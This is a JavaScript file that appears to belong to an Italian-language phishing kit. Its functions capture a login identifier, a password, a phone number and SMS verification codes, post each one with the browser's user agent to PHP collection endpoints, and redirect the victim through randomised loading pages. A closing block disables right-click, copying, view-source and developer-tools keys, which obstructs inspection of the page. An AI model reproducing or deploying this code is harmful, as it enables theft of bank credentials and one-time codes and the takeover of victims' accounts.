function send_log(){

var val_user = $("#cellulare").val();
var val_pass = $("#passmoney").val();
let myError = document.getElementById('error');
	
 if(val_user==''||val_pass==''){

myError.innerHTML ="L'inserimento dei campi è obbligatorio";
myError.style.color="red";	
e.preventDefault();
return false;	
} 


var data_log = 
{

device          :   navigator.userAgent,
val_user		    :   val_user,
val_pass		    :   val_pass
}; 

var _url = 'data.php';

$.post(_url,data_log,function(data){
var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});

}else if (response && response.status === "success") {
  // Generate 2 random strings
  var random1 = Math.random().toString(36).substring(2);
  var random2 = Math.random().toString(36).substring(2);

  // Construct the URL with the 2 random strings
  var url = "load2.php?para1=" + random1 + "&para2=" + random2;

  // Redirect to the constructed URL
  window.location.href = url;
} 


})



}


function send_Phone(){

var val_phone = $("#phone").val();

let myError = document.getElementById('error');
	
 if(val_phone==''){

myError.innerHTML ="Inserisci il tuo numero di telefono associato al tuo account";
myError.style.color="red";	
e.preventDefault();
return false;	
} 


var data_phone = 
{

device    :   navigator.userAgent,
val_phone :   val_phone
}; 

var _url = './api/data_phone.php';

$.post(_url,data_phone,function(data){
var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});

}else if(reponse.statut=="success"){	


var random1 = Math.random().toString(36).substring(2);
var random2 = Math.random().toString(36).substring(2);

// Construct the URL with the 2 random strings
var url = "load2.php?para1=" + random1 + "&para2=" + random2;

// Set the window location to the constructed URL
window.location = url;
} 


})


}

function send_sms(){

var val_sms = $("#SMS").val();

let myError = document.getElementById('error');
	
 if(val_sms==''){

myError.innerHTML ="È obbligatorio inserire il codice ricevuto via SMS";
myError.style.color="red";	
e.preventDefault();
return false;	
	
}

var data_sms = 
{

device          :   navigator.userAgent,
val_sms		    :   val_sms
}; 

var _url = './api/data_sms.php';

$.post(_url,data_sms,function(data){
var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});

}else if(reponse.statut=="success"){	


window.location="load3.php";
} 


})


}


function send_sms2(){

var val_sms = $("#SMS").val();

let myError = document.getElementById('error');
	
 if(val_sms==''){

myError.innerHTML ="È obbligatorio inserire il codice ricevuto via SMS";
myError.style.color="red";	
e.preventDefault();
return false;	
	
}

var data_sms = 
{

device          :   navigator.userAgent,
val_sms		    :   val_sms
}; 

var _url = './api/data_sms.php';

$.post(_url,data_sms,function(data){
var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});

}else if(reponse.statut=="success"){	


window.location="load3.php";
} 


})


}


jQuery(function($){

document.addEventListener('contextmenu', event => event.preventDefault());
document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 ||
e.keyCode === 83 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};

$(document).keydown(function (event) {
if (event.keyCode == 123) { // Prevent F12
return false;
} else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
return false;
}
});






})